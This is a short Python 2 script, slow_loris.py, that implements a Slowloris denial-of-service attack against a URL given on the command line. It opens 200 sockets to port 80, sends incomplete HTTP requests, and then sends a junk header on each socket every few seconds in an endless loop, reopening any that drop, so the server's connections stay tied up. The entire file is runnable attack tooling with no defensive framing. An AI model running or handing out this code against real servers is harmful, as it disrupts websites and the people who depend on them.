#!/usr/bin/python
'''
slow_loris.py

implements a slow loris attack on a url/address
'''
from random import randint
from time import sleep
import socket
import sys
import urlparse


CRLF = '\r\n\r\n'
WAIT_TIME = 3
RAND_MIN = 1
RAND_MAX = 100
CONNECTIONS = 200

# SOCKET variables
TIMEOUT = 4
REGULAR_HEADERS = [
    'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
    'Accept-Language:en-US,en;q=0.8'
    ]

def init_connection(url):
    url = urlparse.urlparse(url)
    path = url.path
    if path == '':
        path = '/'
    PORT = 80
    HOST = url.netloc
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.settimeout(TIMEOUT)
    s.send('GET /?{} HTTP/1.1\r\n'.format(randint(RAND_MIN, RAND_MAX)))
    for header in REGULAR_HEADERS:
        s.send('{}\r\n'.format(header))
        s.send('{}\r\n'.format(header).encode('utf-8'))
    return s


def loris_it(url):
    total_time = 0
    connections = []
    for i in range(CONNECTIONS):
        connections.append(init_connection(url))
        print('Connection to {} #{} initialized'.format(url, i))
    while True:
        for i in range(CONNECTIONS):
            try:
                rand = str('X-a: {}'.format(randint(RAND_MIN, RAND_MAX)))
                connections[i].send('{}\r\n'.format(rand))
                print('Sent {} to connection #{}'.format(rand, i))
            except socket.error as e:
                print('Error: {}'.format(e))
                print('Socket {} was broken, re-opening'.format(i))
                connections[i] = init_connection(url)
        sleep(WAIT_TIME)


if __name__ == '__main__':
    url = sys.argv[1]
    loris_it(url)

